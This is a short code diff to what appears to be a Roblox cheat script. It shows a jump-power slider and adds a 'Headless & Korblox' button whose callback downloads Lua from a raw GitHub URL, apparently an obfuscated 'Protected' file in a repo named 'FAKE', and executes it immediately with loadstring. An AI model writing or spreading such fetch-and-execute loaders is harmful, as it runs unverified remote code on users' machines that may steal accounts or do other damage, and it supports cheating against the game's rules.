@@ -62,3 +62,10 @@ local Slider = PlayerTab:CreateSlider({
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
    end,
 })
+
+local Button = PlayerTab:CreateButton({
+   Name = "Headless & Korblox",
+   Callback = function()
+   loadstring(game:HttpGet("https://raw.githubusercontent.com/ozashub/FAKE/refs/heads/main/Protected_8087317323440302.lua"))()
+   end,
+})
